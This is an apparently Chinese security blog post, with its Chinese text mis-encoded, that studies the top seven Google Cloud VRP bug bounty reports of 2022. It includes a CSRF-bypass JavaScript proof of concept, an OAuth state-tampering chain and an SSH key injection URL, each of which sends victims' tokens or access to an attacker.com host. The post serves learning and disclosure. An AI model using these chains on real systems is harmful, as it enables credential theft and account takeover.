      <link href="/2023/06/28/GoogleCloudVrp-top7-2022-Study-and-Ideas/"/>
      <url>/2023/06/28/GoogleCloudVrp-top7-2022-Study-and-Ideas/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€ï¼š"><a href="#å‰è¨€ï¼š" class="headerlink" title="å‰è¨€ï¼š"></a>å‰è¨€ï¼š</h2><p>Googleå®‰å…¨å›¢é˜Ÿè¿‘æœŸå‘å¸ƒäº†2022å¹´GoogleCloud VRPä¸­èµé‡‘top7çš„æ¼æ´</p><p><a href="https://security.googleblog.com/2023/06/google-cloud-awards-313337-in-2022-vrp.html?continueFlag=8d8e2a2b6ab56e4030b5b194ac3f4922">https://security.googleblog.com/2023/06/google-cloud-awards-313337-in-2022-vrp.html?continueFlag=8d8e2a2b6ab56e4030b5b194ac3f4922</a></p><blockquote><p><strong>1st Prize -</strong> $133,337: Yuval Avrahami for the report and write-up <a href="https://unit42.paloaltonetworks.com/gke-autopilot-vulnerabilities/">Privilege escalations in GKE Autopilot</a>. Yuvalâ€™s excellent write-up describes several attack paths that would allow an attacker with permission to create pods in an Autopilot cluster to escalate privileges and compromise the underlying node VMs. While these VMs are accessible to customers in GKE Standard, this research led to several <a href="https://cloud.google.com/anthos/clusters/docs/security-bulletins#gcp-2022-009">hardening improvements</a> in Autopilot that make it a better <a href="https://cloud.google.com/kubernetes-engine/docs/concepts/autopilot-security">secure-by-default</a> Kubernetes offering.</p><p><strong>2nd Prize -</strong> $73,331: Sivanesh Ashok and Sreeram KL for the report and write-up <a href="https://blog.stazot.com/ssh-key-injection-google-cloud/">SSH Key Injection on GCE</a>. Their write-up describes the journey of discovering a vulnerability that would allow an attacker to gain access to a userâ€™s GCE VM by tricking them into clicking a link. They demonstrate the importance of persistence and turned a strange behavior in user creation into an injection of arbitrary SSH public keys.</p><p><strong>3rd Prize -</strong>  $31,337: Sivanesh Ashok and Sreeram KL for the report and write-up <a href="https://blog.stazot.com/auth-bypass-in-google-cloud-workstations/">Bypassing Authorization in Cloud Workstations</a>. Their write-up describes their research process for analyzing Cloud Workstations and then a full-chain exploit to steal a userâ€™s access token by abusing the format of an OAuth state parameter.</p><p><strong>4th Prize -</strong> $31,311: Sreeram KL and Sivanesh Ashok for the report and write-up <a href="https://blog.geekycat.in/client-side-ssrf-to-google-cloud-project-takeover/">Client-Side SSRF to Google Cloud Project Takeover</a>. Their write-up combines a client-side SSRF, a CSRF bypass, and a clever 3xx redirect by â€œdeactivatingâ€ a Feedburner proxy. An attacker could use this vulnerability to steal a Vertex AI userâ€™s access token by tricking them into clicking a link.</p><p><strong>5th Prize -</strong> $17,311: Yuval Avrahami and Shaul Ben Hai for the report and write-up <a href="https://www.paloaltonetworks.com/apps/pan/public/downloadResource?pagePath=/content/pan/en_US/resources/whitepapers/kubernetes-privilege-escalation-excessive-permissions-in-popular-platforms">Kubernetes Privilege Escalation: Excessive Permissions in Popular Platforms</a>. Their whitepaper covers privilege escalation vectors in Kubernetes and describes vulnerabilities in many Kubernetes hosting providers, including Azureâ€™s AKS, Amazonâ€™s EKS, and GKE.</p><p><strong>6th Prize -</strong> $13,373: Obmi for the report and write-up <a href="https://obmiblog.blogspot.com/2022/12/gcp-2022-few-bugs-in-google-cloud-shell.html">A Few Bugs in the Google Cloud Shell</a>. Obmi discovered vulnerabilities in the Cloud Shell file upload functionality that would have allowed an attacker to write arbitrary files to a userâ€™s Cloud Shell via cross-site request forgery.</p><p><strong>7th Prize -</strong> $13,337: Bugra Eskici for the report and write-up <a href="https://bugra.ninja/posts/cloudshell-command-injection/">Command injection in Cloud Shell</a>. Bugra found a very curious injection point in a Cloud Shell script that led to a URL query parameter being directly injected into a Python script. This vulnerability would have given an attacker arbitrary code execution in a userâ€™s Cloud Shell if they clicked on an attacker-controlled link.</p></blockquote><p>æœ¬äººæ ¹æ®googleå®˜æ–¹ç»™å‡ºçš„YouTubeè§†é¢‘è¿›è¡Œäº†å­¦ä¹ ,å¹¶ä¸”æ ¹æ®ä¸ªäººç†è§£å¯¹å…¶ä¸­çš„æ¡ˆä¾‹ç»†èŠ‚è¿›è¡Œäº†è§£é‡Šä»¥åŠæ€è·¯æ€»ç»“ï¼Œæœ¬æ–‡é…å›¾å‡æ¥æºäºgoogleå®˜æ–¹è§†é¢‘ä¸writeup</p><p>èƒ½åŠ›æ°´å¹³æœ‰é™ï¼Œå¦‚æœ‰è°¬è¯¯ï¼Œæ¬¢è¿å¤§å®¶æŒ‡å‡º</p><p>Googleå®˜æ–¹è§†é¢‘ï¼š<a href="https://youtu.be/uOvizKc1WZY">https://youtu.be/uOvizKc1WZY</a></p><p>ç°å°†TOP 7æ¼æ´æ¡ˆä¾‹å­¦ä¹ ä¸æ€è€ƒå½’çº³æ€»ç»“å¦‚ä¸‹</p><h2 id="7th-Prize-Command-injection-in-Cloud-Shell-ï¿¥13337"><a href="#7th-Prize-Command-injection-in-Cloud-Shell-ï¿¥13337" class="headerlink" title="7th Prize: Command injection in Cloud Shell - ï¿¥13337"></a>7th Prize: Command injection in Cloud Shell - ï¿¥13337</h2><p>è¿™ä¸ªç«™è¯´æ¥æƒ­æ„§ï¼Œç¬”è€…æ›¾ç»æŒ–Google VRPçš„æ—¶å€™ä¹ŸæŒ–è¿‡ï¼Œæ˜¯ä¸€ä¸ªåŸºäºCSRFçš„command Injectionï¼Œè§¦å‘èµ·æ¥æ¯”è¾ƒå›°éš¾ï¼Œgoogleå®‰å…¨å›¢é˜Ÿè®¤ä¸ºè¿™æ¯”è¾ƒé¸¡è‚‹ï¼Œå› æ­¤æ²¡æœ‰æ”¶å–æ¼æ´</p><p>ä½†æ˜¯è€å¤–å´æåˆ°äº†ä¸€ä¸ªçœŸæ­£çš„command injectionã€‚ã€‚è®©æˆ‘ç¾¡æ…•ä¸å·²</p><p>åœ¨GoogleCloudçš„web editorä¸­ï¼Œå†…ç½®äº†shellï¼Œè€Œurlä¸­çš„projectå‚æ•°ä¼¼ä¹æ€»ä¼šå‡ºç°åœ¨python configè„šæœ¬ä¸­ï¼Œå¹¶ä¸”ä¼šå¼•å‘è„šæœ¬æ‰§è¡Œ</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202306271234324.png" alt="image-20230627123429297"></p><p>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œå•å¼•å·è§¦å‘äº†ä¸€ä¸ªpython console error </p><p>é‚£ä¹ˆæ¥ä¸‹æ¥äº‹æƒ…å°±å¾ˆç®€å•äº†ï¼Œæ ¹æ®ç›®æ ‡çš„é—­åˆfeatureæ„é€ ä¸€ä¸ªonelineå‘½ä»¤æ‰§è¡Œå³å¯</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202306271240994.png" alt="image-20230627124005960"></p><h3 id="æ¼æ´å‘æ˜çš„æ€è€ƒç‚¹ï¼š"><a href="#æ¼æ´å‘æ˜çš„æ€è€ƒç‚¹ï¼š" class="headerlink" title="æ¼æ´å‘æ˜çš„æ€è€ƒç‚¹ï¼š"></a><strong>æ¼æ´å‘æ˜çš„æ€è€ƒç‚¹ï¼š</strong></h3><p><strong>æ°¸è¿œä¸è¦æ”¾è¿‡ä»»ä½•ä¸€ä¸ªç”¨æˆ·å¯æ§çš„å‚æ•°ç‚¹~</strong></p><h2 id="6th-Prize-A-Few-Bugs-in-the-Google-Cloud-Shell-ï¿¥13337"><a href="#6th-Prize-A-Few-Bugs-in-the-Google-Cloud-Shell-ï¿¥13337" class="headerlink" title="6th Prize: A Few Bugs in the Google Cloud Shell - ï¿¥13337"></a>6th Prize: A Few Bugs in the Google Cloud Shell - ï¿¥13337</h2><p>æ¼æ´å‘ç°è€…æ‰¾åˆ°äº†ä¸€ä¸ªåŸºäºæ–‡ä»¶ä¸Šä¼ çš„XSS</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202306271244864.png" alt="image-20230627124440839"></p><p>ä½†æ˜¯è¿™æ ·è§¦å‘åªæ˜¯ä¸€ä¸ªself xssï¼Œå¹¶ä¸ç¬¦åˆVRPçš„æ”¶å½•è§„åˆ™ï¼Œä½†æ˜¯æ¼æ´å‘ç°è€…åˆé€šè¿‡éå¸¸Coolçš„å§¿åŠ¿ï¼Œå‘ç°äº†æ­¤å¤„çš„CSRF</p><p>åœ¨æœ¬å¤„è¦å®ç°æ–‡ä»¶ä¸Šä¼ å¤„çš„CSRFï¼Œéœ€è¦è·å¾—ä¸€ä¸ªéšæœºçš„idï¼Œä½†æ˜¯å¾ˆæ˜¾ç„¶ï¼Œè¿™ä¸ªidå¹¶ä¸å®¹æ˜“çŒœè§£è·å–</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202306271248251.png" alt="image-20230627124856216"></p><p>äºæ˜¯æ¼æ´å‘æ˜è€…æ„é€ äº†ä¸€ä¸ªPOCï¼Œåœ¨æ‹–æ‹½å›¾ç‰‡æ—¶å¯ä»¥è·å–åˆ°ç›®æ ‡å¸¦æœ‰è¿™ä¸ªéšæœºidçš„æ–‡ä»¶ä¸Šä¼ urlï¼Œä»è€Œå®ç°CSRFï¼Œè¿›è€Œè§¦å‘XSS</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202306271247346.png" alt="image-20230627124728387"></p><p>å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œæ‹–æ‹½è¿™ä¸ªimageï¼Œå¯ä»¥è·å–åˆ°è¿™ä¸ªéšæœºid</p><p>è¿›è€Œå®Œæˆè·å–id-&gt;æ–‡ä»¶ä¸Šä¼ csrf-&gt;å®ç°XSSçš„æ”»å‡»é“¾</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202306271252333.png" alt="image-20230627125239304"></p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202306271253623.png" alt="image-20230627125308590"></p><p>ä¸å¾—ä¸è¯´ï¼Œè¿™ä¸€æ•´å¥—åˆ©ç”¨é“¾éå¸¸amazing</p><h3 id="æ¼æ´å‘æ˜çš„æ€è€ƒç‚¹ï¼š-1"><a href="#æ¼æ´å‘æ˜çš„æ€è€ƒç‚¹ï¼š-1" class="headerlink" title="æ¼æ´å‘æ˜çš„æ€è€ƒç‚¹ï¼š"></a><strong>æ¼æ´å‘æ˜çš„æ€è€ƒç‚¹ï¼š</strong></h3><p>1.Self XSSç»“åˆCSRFå˜åºŸä¸ºå®</p><p>2.åœ¨æŸäº›å­˜åœ¨<strong>unique id</strong>çš„æƒ…å†µä¸‹ï¼Œå¯è€ƒè™‘é€šè¿‡ä¸€äº›ç±»ä¼¼äºç»å…¸çš„â€<strong>click hijacking</strong>â€œæ–¹å¼ï¼Œè·å–çœ‹ä¼¼æ”»å‡»è€…æ— æ³•è·å–åˆ°çš„è®¯æ¯</p><h2 id="5th-Prize-Kubernetes-Privilege-Escalation-Excessive-Permissions-in-Popular-Platforms-17-311"><a href="#5th-Prize-Kubernetes-Privilege-Escalation-Excessive-Permissions-in-Popular-Platforms-17-311" class="headerlink" title="5th Prize: Kubernetes Privilege Escalation: Excessive Permissions in Popular Platforms - $17,311"></a>5th Prize: Kubernetes Privilege Escalation: Excessive Permissions in Popular Platforms - $17,311</h2><p>è¿™ä¸ªæ¼æ´æ¯”è¾ƒç‰¹æ®Šï¼Œä¸å…¶è¯´å«æ¼æ´ï¼Œä¸å¦‚è¯´å«å®‰å…¨ç™½çš®ä¹¦~</p><p>ç™½çš®ä¹¦å¹¶æ²¡æœ‰ç›´æ¥æè¿°æ¼æ´æˆ–è€…å®‰å…¨é—®é¢˜ï¼Œä½†æ˜¯å…¶æ­ç¤ºäº†è¯¸å¤šæä¾›KubernetesæœåŠ¡çš„å…¬æœ‰äº‘å‚å•†åœ¨podså¤±é™·åä¸ç‰¹æƒä¸‹çš„â€DaemonSetsâ€å®¹å™¨äº§ç”Ÿçš„æƒé™æå‡çš„ç«èŠ±ï¼Œå¹¶ç»™å‡ºäº†kubernetesæƒé™é…ç½®å®‰å…¨åˆç†æ€§çš„æ£€æµ‹å·¥å…·</p><p>Googleè®¤ä¸ºè¿™å¯¹äºKubernetesç”Ÿæ€æœ‰æ‰€è£¨ç›Šï¼Œå› æ­¤ç»™å‡ºäº†$17311çš„å¥–åŠ±</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202306271300155.png" alt="image-20230627130025127"></p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202306271258692.png" alt="image-20230627125847654"></p><p>ç™½çš®ä¹¦é“¾æ¥ï¼š</p><p><a href="https://www.paloaltonetworks.com/apps/pan/public/downloadResource?pagePath=/content/pan/en_US/resources/whitepapers/kubernetes-privilege-escalation-excessive-permissions-in-popular-platforms">https://www.paloaltonetworks.com/apps/pan/public/downloadResource?pagePath=/content/pan/en_US/resources/whitepapers/kubernetes-privilege-escalation-excessive-permissions-in-popular-platforms</a></p><h3 id="æ¼æ´å‘æ˜çš„æ€è€ƒç‚¹ï¼š-2"><a href="#æ¼æ´å‘æ˜çš„æ€è€ƒç‚¹ï¼š-2" class="headerlink" title="æ¼æ´å‘æ˜çš„æ€è€ƒç‚¹ï¼š"></a><strong>æ¼æ´å‘æ˜çš„æ€è€ƒç‚¹ï¼š</strong></h3><p><strong>å¯¹äºä¸€ä¸ªé¡¹ç›®å®‰å…¨ç”Ÿæ€æœ‰æ‰€è£¨ç›Šçš„äº§å‡ºï¼Œå¾€å¾€æ¯”å•ç‚¹æ¼æ´æ‹¥æœ‰æ›´é«˜çš„æ™®é€‚æ€§ä»·å€¼</strong></p><h2 id="4th-Prize-Client-Side-SSRF-to-Google-Cloud-Project-Takeover-31-311"><a href="#4th-Prize-Client-Side-SSRF-to-Google-Cloud-Project-Takeover-31-311" class="headerlink" title="4th Prize: Client-Side SSRF to Google Cloud Project Takeover - $31,311"></a><strong>4th Prize: Client-Side SSRF to Google Cloud Project Takeover -</strong> $31,311</h2><p>è¿™ä¸ªæ¼æ´çš„å‘æ˜teamåŒæ ·æ˜¯3th,2thå¥–åŠ±çš„å‘ç°è€…ï¼Œå¯è°“æ˜¯ç¥é›•ä¾ ä¾£äº†ã€‚ã€‚ã€‚</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202306271336814.png" alt="image-20230627133641772"></p><p>æ¼æ´å‘æ˜è€…åœ¨pentestä¸­å‘ç°äº†å¦‚ä¸‹çš„URLï¼š</p><blockquote><p>https:&#x2F;&#x2F;{INSTANCE-ID}-dot-us-central1.notebooks.googleusercontent.com&#x2F;aipn&#x2F;v2&#x2F;proxy&#x2F;<strong>compute.googleapis.com</strong>&#x2F;something</p></blockquote><p>æ„Ÿè§‰è¿™ä¸ªç‚¹å¯èƒ½å­˜åœ¨SSRFåä½¿ç”¨äº†è‡ªå·±çš„åŸŸåè¿›è¡Œæµ‹è¯•</p><blockquote><p>https:&#x2F;&#x2F;{INSTANCE-ID}-dot-us-central1.notebooks.googleusercontent.com&#x2F;aipn&#x2F;v2&#x2F;proxy&#x2F;<strong>geekycat.in</strong>&#x2F;something</p></blockquote><p>ä½†æ˜¯å¹¶ä¸å¥æ•ˆï¼Œäºæ˜¯ç”¨äº†ä¸€ä¸ªç®€å•çš„tips bypassäº†é™åˆ¶</p><blockquote><p><code>https://&#123;INSTANCE-ID&#125;-dot-us-central1.notebooks.googleusercontent.com/aipn/v2/proxy/&#123;attacker.com&#125;/compute.googleapis.com/</code> </p><p><strong>æ¥è‡ªä½œè€…ï¼šbypasses the check, that was easy ğŸ˜…</strong></p></blockquote><p>æ¥ä¸‹æ¥ä½œè€…æœåŠ¡å™¨çš„æ—¥å¿—æ˜¾ç¤ºï¼Œå®ƒæ”¶åˆ°äº†headerä¸­å¸¦æœ‰Authorization tokençš„è¯·æ±‚ã€‚</p><p>éšåéªŒè¯äº†Authorization tokenï¼Œå‘ç°ç¡®å®æœ‰äº‘å¹³å°æƒé™~</p><p>è‡³æ­¤å®ç°æƒé™æ¥ç®¡</p><p>googleéšåä¿®å¤äº†è¿™ä¸ªæ¼æ´ï¼Œåªå…è®¸è¿™ä¸ªç‚¹è¯·æ±‚*.google.comï¼Œä½†æ˜¯æ¼æ´å‘æ˜è€…æ‰¾åˆ°äº†Bypassçš„æ–¹æ³•</p><h3 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h3><p>æ¼æ´å‘æ˜è€…éšåå‘ç°äº†ä¸€ä¸ªè°·æ­Œçš„å­åŸŸæœåŠ¡ <code>https://feedburner.google.com</code>. </p><p>è¯¥æœåŠ¡å…è®¸å¯ä»¥ç®¡ç†åŸŸåä¸‹çš„RSSæè¦ã€‚ç±»ä¼¼äºRSS Proxyä¸€æ ·ã€‚</p><p>éšåæ¼æ´æŒ–æ˜è€…é€šè¿‡ä»¥ä¸‹æ–¹æ³•è§†å›¾æ„å»ºOpenRedirect</p><ul><li>å¯¼èˆªè‡³<code>https://feedburner.google.com</code>â€“&gt; åˆ›å»ºä»£ç† â€“&gt; è¾“å…¥<code>https://attacker.com/rss.xml</code></li><li>ä½¿ç”¨â€œè‡ªå®šä¹‰ URLâ€â€“&gt; åˆ›å»º</li></ul><p>å¤åˆ¶çš„ URL çš„æ ¼å¼å¦‚ä¸‹ï¼š<code>https://feeds.feedburner.com/&#123;CUSTOM&#125;/&#123;ID&#125;</code></p><ul><li>åˆ›å»ºä»£ç†åï¼Œå•å‡»ä¸‰ä¸ªç‚¹ â€“&gt; åœç”¨ â€“&gt; ç¡®è®¤</li></ul><p>ç°åœ¨ï¼Œå—å®³è€…è®¿é—®<code>https://feeds.feedburner.com/&#123;CUSTOM&#125;/&#123;ID&#125;</code>å°†ä¼šå®ç°ä¸€ä¸ªOpenRedirect</p><p>ä½†æ˜¯å¹¶ä¸æ˜¯ä¸€å¸†é£é¡ºçš„</p><p>è®¿é—®<code>https://&#123;INSTANCE-ID&#125;-dot-us-central1.notebooks.googleusercontent.com/aipn/v2/proxy/feedproxy.google.com/&#123;CUSTOM&#125;/&#123;ID&#125;</code></p><p>æ— æ³•å®ç°SSRFï¼Œå› ä¸ºGoogleå®æ–½äº†CSRFä¿æŠ¤ã€‚</p><p>éšåæ¼æ´å‘æ˜è€…æ³¨æ„åˆ°Jupyter notebookæ˜¯éƒ¨ç½²åœ¨tornadoä¸Šçš„ï¼Œè€Œtornadoæœ‰ä¸€ç§ç»•è¿‡csrfæ ¡éªŒçš„æ–¹æ³•ï¼š</p><blockquote><p>TornadoæœåŠ¡å™¨ä¼šæ¯”è¾ƒGETå‚æ•°&#x2F;POSTåŒ…ä¸­çš„CSRFä»¤ç‰Œä¸cookieä¸­çš„CSRFä»¤ç‰Œã€‚</p><p>å¦‚æœä¸¤è€…éƒ½åŒ¹é…ï¼Œåˆ™é€šè¿‡ã€‚å¦åˆ™ï¼Œå¤±è´¥ã€‚</p><p><strong>ç”±äºå­åŸŸå¯ä»¥å°†cookieè®¾ç½®ä¸ºçˆ¶åŸŸï¼Œå› æ­¤åœ¨ä»»ä½•å­åŸŸä¸­æ‰§è¡Œjavascriptå°†å…è®¸æˆ‘ä»¬ä¸ºcookieè®¾ç½®ä»»æ„CSRFä»¤ç‰Œï¼Œç„¶åç»•è¿‡CSRFä¿æŠ¤ã€‚</strong></p></blockquote><p>äºæ˜¯æ¼æ´æŒ–æ˜è€…åœ¨googleusercontent.coméƒ¨ç½²äº†ä¸€ä¸ªjupyter</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202306271428761.png" alt="image-20230627142813741"></p><p>å¹¶ä¸”ä¿®æ”¹äº†Jupyterç¬”è®°æœ¬çš„ç´¢å¼•é¡µ(ä½äº&#x2F;opt&#x2F;conda&#x2F;share&#x2F; Jupyter &#x2F;lab&#x2F;staticä¸‹)</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202306271428358.png" alt="image-20230627142804323"></p><p>ç”±äºå·²ç»æˆåŠŸåœ°è·å¾—äº†javascriptçš„æ‰§è¡Œæƒï¼Œæˆ‘ä»¬ç°åœ¨å¯ä»¥è®¾ç½®ä»»æ„çš„CSRFä»¤ç‰Œå¹¶ç»•è¿‡ä¿æŠ¤ã€‚</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;body&gt;    &lt;script&gt;        var base_domain = document.domain.substr(document.domain.indexOf(&#39;.&#39;));        document.cookie=&#39;_xsrf=1;Domain=&#39;+base_domain;fetch(&quot;https://&#123;VICTIM-INSTANCE-ID&#125;-dot-us-central1.notebooks.googleusercontent.com/aipn/v2/proxy/feedproxy.google.com/&#123;CUSTOM&#125;/&#123;ID&#125;?_xsrf=1&quot;,&#123;credentials:&quot;include&quot;,mode:&quot;no-cors&quot;&#125;)    &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>è¿›è€Œè·å–Authorization headerï¼Œæ¼æ´åˆ©ç”¨å®Œæˆ~</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202306271428288.png" alt="image-20230627142855242"></p><h3 id="æ¼æ´å‘æ˜çš„æ€è€ƒç‚¹ï¼š-3"><a href="#æ¼æ´å‘æ˜çš„æ€è€ƒç‚¹ï¼š-3" class="headerlink" title="æ¼æ´å‘æ˜çš„æ€è€ƒç‚¹ï¼š"></a><strong>æ¼æ´å‘æ˜çš„æ€è€ƒç‚¹ï¼š</strong></h3><p>è¿™ä¸ªæ¼æ´æ˜¯æˆ‘è®¤ä¸ºbypassæœ€ä¸ºç²¾å¦™çš„ä¸€ä¸ªï¼Œå­¦åˆ°çš„æœ‰ä»¥ä¸‹å‡ ç‚¹ï¼š</p><p>1.tornadoçš„csrfæ ¡éªŒbypass feature</p><p>2.å½“å‚å•†åœ¨SSRFç‚¹é™åˆ¶äº†è‡ªå·±çš„æ ¹åŸŸååï¼Œå¯ä»¥è€ƒè™‘ä»å­åŸŸçš„ä¸šåŠ¡ç‚¹å…¥æ‰‹æŒ–æ˜ä¸€ä¸ªOpenRedirectï¼Œåœ¨æ”¯æŒ302è·³è½¬çš„æƒ…å†µä¸‹å¾€å¾€ä¼šäº§ç”Ÿæ„æƒ³ä¸åˆ°çš„æ•ˆæœ</p><h2 id="3rd-Prize-Bypassing-Authorization-in-Cloud-Workstations-31337"><a href="#3rd-Prize-Bypassing-Authorization-in-Cloud-Workstations-31337" class="headerlink" title="3rd Prize: Bypassing Authorization in Cloud Workstations - $31337"></a>3rd Prize: Bypassing Authorization in Cloud Workstations - $31337</h2><p>è¿™ä¸ªæ¼æ´æ¯”è¾ƒéº»çƒ¦ï¼Œæ˜¯ä¸€ä¸ªOuthå±‚é¢çš„æ¼æ´ï¼ŒOuthä¸­ç»å…¸çš„å¾€å¾€æ˜¯æ§åˆ¶redirect urlå®ç°å‡­æ®åŠ«æŒ</p><p>ä½†æ˜¯è¿™ä¸ªç‚¹ç¨å¾®å¤šäº†ç‚¹æ­¥éª¤ï¼Œè¦å…ˆè·å–åˆ°å—å®³è€…outhçš„urlå†è¿›è¡Œæ„é€ æ‰èƒ½å®ç°å‡­æ®åŠ«æŒï¼Œå› æ­¤ç›´æ¥ç»™å‡ºä½œè€…çš„Attack Chainä¾›å¤§å®¶å‚è€ƒ</p><blockquote><ol><li><p><strong>è®¿é—®{victim-subdomain}.cloudworkstations.dev</strong></p></li><li><p><strong>è¢«é‡å®šå‘åˆ°å¹¶ç»™å‡º 500 å“åº”<code>https://ssh.cloud.google.com/devshell/oauth?authuser=0&amp;state=&#123;state-value&#125;</code></strong></p></li><li><p><strong>stateå‚æ•°ä¸ºbase64åŠ å¯†çš„å­—ç¬¦ä¸²ï¼Œè§£å¯†åæ•°æ®å®ä¾‹å¦‚ä¸‹</strong></p><pre><code class="json">&#123;&quot;token&quot;:&quot;random-token&quot;,&quot;target_host&quot;:&quot;attacker.com/80-&#123;workstation-name&#125;.cluster-&#123;random-string&#125;.cloudworkstations.dev&quot;,&quot;authuser&quot;:&quot;&quot;,&quot;workstation_name&quot;:&quot;projects/project-name-374312/locations/us-central1/workstationClusters/cluster-name/workstationConfigs/config-name/workstations/workstation-name&quot;,&quot;workstation_consumer_project_number&quot;:&quot;0123456789&quot;&#125;</code></pre><p><strong>ä»base64è§£ç çŠ¶æ€å‚æ•°ï¼Œå¹¶å°†target_hostå€¼æ›´æ”¹ä¸º<code>attacker.com/&#123;victim-subdomain&#125;.cloudworkstations.dev</code></strong></p></li><li><p><strong>å°† JSON é‡æ–°ç¼–ç ä¸º base64 å¹¶åˆ›å»ºæ–°çš„çŠ¶æ€å€¼</strong></p></li><li><p><strong>ä½¿ç”¨ä¿®æ”¹åçš„çŠ¶æ€å€¼åˆ¶ä½œ OAuth URL -å¹¶å°†æ¶æ„é“¾æ¥å‘é€ç»™å—å®³è€…<code>https://ssh.cloud.google.com/devshell/oauth?authuser=0&amp;state=&#123;malicious-state-value&#125;</code></strong></p></li><li><p><strong>ä¸€æ—¦å—å®³è€…æ‰“å¼€æ¶æ„é“¾æ¥ï¼Œæ”»å‡»è€…å°±ä¼šæ”¶åˆ°å¯¹å…¶æœåŠ¡å™¨çš„ GET è¯·æ±‚ï¼Œè¯¥è¯·æ±‚å°†å…·æœ‰ workstation_jwt å€¼ã€‚</strong></p></li><li><p><strong>ç„¶åï¼Œæ”»å‡»è€…ä½¿ç”¨å—å®³è€…çš„å‡­æ®å¹¶è®¿é—®å—å®³è€…çš„å·¥ä½œç«™<code>https://&#123;victim-subdomain&#125;.cloudworkstations.dev/_workstation/login?redirect=&#123;state-value&#125;&amp;workstation_jwt=&#123;victim-jwt-value&#125;</code></strong></p></li></ol></blockquote><h3 id="æ¼æ´å‘æ˜çš„æ€è€ƒç‚¹ï¼š-4"><a href="#æ¼æ´å‘æ˜çš„æ€è€ƒç‚¹ï¼š-4" class="headerlink" title="æ¼æ´å‘æ˜çš„æ€è€ƒç‚¹ï¼š"></a><strong>æ¼æ´å‘æ˜çš„æ€è€ƒç‚¹ï¼š</strong></h3><p>1.å¤šå¤šç•™æ„ä¸€äº›å¼±åŠ å¯†çš„å‚æ•°å€¼ï¼Œå¾€å¾€éšè—ç€ä¸ä¸ºäººçŸ¥çš„ç§˜å¯†</p><p>2.Outhæ¼æ´ä¸­openRedirectå¯¼è‡´çš„å‡­æ®åŠ«æŒä¸ä¸€å®šå°±æ˜¯å†™è„¸ä¸Šçš„redirectUrlå¯æ§~å°½é‡å»å‘æ˜å¯æ§çš„redirectå‚æ•°ç‚¹ï¼Œé’ˆå¯¹å®æˆ˜æƒ…å†µå†è¿›è¡Œbypass</p><h2 id="2nd-Prize-SSH-Key-Injection-on-GCE-73-331"><a href="#2nd-Prize-SSH-Key-Injection-on-GCE-73-331" class="headerlink" title="2nd Prize: SSH Key Injection on GCE - $73,331"></a><strong>2nd Prize: SSH Key Injection on GCE -</strong> $73,331</h2><p>æ¼æ´å‘æ˜è€…åœ¨google cloudçš„<em>Google</em> Compute Engineï¼ˆGCEï¼‰çš„instanceæ·»åŠ SSH Keyæ—¶ï¼Œä½¿ç”¨äº†å½¢å¦‚</p><pre><code>curl https://stazot.com</code></pre><p>çš„payload</p><p>ä½†æ˜¯å´å‡ºç°äº†å¦‚ä¸‹å›¾æ‰€ç¤ºçš„å¥‡è‘©è¾“å‡º</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202306280909736.png" alt="img"></p><p>æ¼æ´å‘æ˜è€…ç¬é—´å¤©çµç›–ç‚¸å¼€ï¼ŒåŸæ¥å†’å·:ä¼šè¢«å½“æˆè¿™ä¸ªç‚¹çš„åˆ†éš”ç¬¦å·ã€‚</p><p>å†’å·å‰çš„ä½œä¸ºusernameï¼Œå†’å·åä½œä¸ºssh keyï¼Œå¹¶ä¸”è¿™ä¸€åˆ‡éƒ½æ˜¯é€šè¿‡getæ–¹å¼è¿›è¡Œä¼ å‚çš„</p><p>å› æ­¤ï¼Œæ¼æ´å‘æ˜è€…å‡†å¤‡æ„é€ URLï¼Œè®©å—å®³è€…æ‰“å¼€æ¶æ„é“¾æ¥ä¼šå°†æ”»å‡»è€…çš„ç”¨æˆ·åå’Œ SSH å¯†é’¥æ·»åŠ åˆ°ä»–ä»¬çš„è®¡ç®—å®ä¾‹ä¸­ã€‚</p><p>ä»¥ä¸‹ URL attacker:{URL-ENCODED-SSH-PUBLIC-KEY} ä½œä¸ºExploitå¤„ï¼š</p><pre><code>https://ssh.cloud.google.com/v2/ssh/projects/&#123;PROJECT-NAME&#125;/zones/&#123;INSTANCE-ZONE&#125;/instances/&#123;INSTANCE-NAME&#125;?newLinuxUsername=attacker:&#123;URL-ENCODED-SSH-PUBLIC-KEY&#125;</code></pre><p>ä»¥å—å®³è€…èº«ä»½æ‰“å¼€é“¾æ¥ - ä½†æ˜¯ï¼Œå®ƒæ²¡æœ‰å¥æ•ˆã€‚</p><p>åŸå› æ˜¯æ·»åŠ çš„SSHå¯†é’¥éšåé™„åŠ äº†Googleåœ¨åç«¯è‡ªåŠ¨ç”Ÿæˆçš„SSHå¯†é’¥ã€‚</p><p>ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæ¼æ´å‘æ˜è€…åœ¨æœ‰æ•ˆè´Ÿè½½åé™„åŠ 